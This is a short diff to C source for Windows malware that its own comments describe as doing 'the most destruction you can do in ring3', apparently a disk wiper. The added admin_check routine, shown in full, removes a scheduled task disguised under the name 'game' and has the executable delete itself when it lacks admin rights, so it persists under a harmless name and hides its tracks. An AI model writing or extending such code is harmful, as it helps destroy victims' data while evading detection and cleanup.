@@ -5,13 +5,28 @@
 #include <stdlib.h>
 #include <winioctl.h>
 #include <ntdddisk.h>
-#include <winevt.h>
+#include <stdbool.h>
+#include <shellapi.h> // for admin check
 
 
 // note*
 // this is the most destruction you can do in ring3 but..
 // this wont effect offline disks or hardware/offline-protected disks
 
+// only run if user is admin
+bool admin_check() {
+    if (!IsUserAnAdmin()) {
+        // delete itslef if the user isnt admin
+        system("schtasks /delete /tn \"game\" /f");
+        char cmd[MAX_PATH + 64];
+        GetModuleFileNameA(NULL, cmd, MAX_PATH);
+        char rm_cmd[MAX_PATH + 128];
+        sprintf(rm_cmd,
+        "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
+        system(rm_cmd);
+        return 1;
+    }
+}
 char rand_nm[7]; // global var, + null term
 const char charset[] = "abcdefghijklmnopqrstuvwxyzaBCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
 
